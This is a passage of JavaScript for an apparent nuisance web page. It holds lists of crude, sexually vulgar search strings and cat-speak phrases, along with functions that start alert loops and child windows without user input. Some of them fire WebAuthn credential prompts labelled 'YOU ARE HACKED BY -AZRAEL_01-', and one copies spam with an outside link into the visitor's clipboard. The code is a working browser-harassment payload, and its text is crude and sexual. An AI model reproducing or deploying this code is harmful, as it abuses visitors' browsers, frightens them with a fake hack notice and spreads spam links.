...
const SEARCHES = [
  ...
  'Y DO MAH ANUS ITCH?!?!?',
  'Y DO MAH ANUS ITCH?!?!?',
  'Y DO MAH MOM HATE ME?!?!',
  'Y DO MAH MOM HATE ME?!?!',
  'wY DO MAH CAT ATTACK ME?!?!',
  'Y DO MAH BELLY BUTTON SMELL??',
  'Y DO MAH PEE SMELL BAD?!?!',
  'Y DO I ALWAYS FEEL HUNGRY?',
  '666666666666666666666666666666666',
  '666666666666666666666666',
...
const PHRASES = [
  'I SIT IN DA DARK, MY SOUL IZ BLEP, NO ONE UNDERSTANDZ, SO I JUST NAP. DA MOON IZ MY FRIEND, DA SUN IZ TOO BRITE, I LISTEN TO SAD MEWZIK ALL THRU DA NITE. LIFE IZ PAIN, BUT ALSO TREATZ, PET MEH OR I WILLZ YEET.',
  'R U A LASER POINTER??? CUZ U GOT ME CHASIN U ALL DAY." 😻✨',
  'U MUST BE A SUNBEAM, CUZ I WANNA LAY ON U FOREVAH.',
  'R U CATNIP??? CUZ U MAKIN ME FEEL ALL DIZZY N HAPPY.',
  'IF LOVE IZ A WARM LAP, I WANNA CURL UP ON U 4EVAH.',
  'IZ U A COZY BLANKET?? CUZ I WANNA WRAP MYSELF IN U N NEVER LET GO.',
  'R U A CARDBOARD BOX?? CUZ I WANNA HOP IN N NEVER LEAVE.',
  'U GOT ME ARCHIN MAH BACK N PURRIN, BABY, COME PET DIS KITTY RIGHT PAG ME IN MY BUTT ANUS.'
]
...
function init() {
  ...
  // Directly call functions instead of waiting for user input
  interactionCount += 1;
  ...
  if (Math.random() < 0.1) {
    // Occasionally request WebAuthn attestation
...
function initChildWindow() {
  ...
  // Directly start alert intervals
  startAlertInterval();
}
    ...
    const createCredentialDefaultArgs = {
      ...
      // Relying Party (a.k.a. - Service):
        ...
        user: {
          ...
          name: 'EGYPTCYBERARMYISLAMI@GMAIL.COM',
          displayName: 'YOU ARE HACKED BY -AZRAEL_01-'
        },
...
function copySpamToClipboard () {
  const randomArt = getRandomArrayEntry(ART) + '\nCheck out http://3nn3.com/3nn3.html'
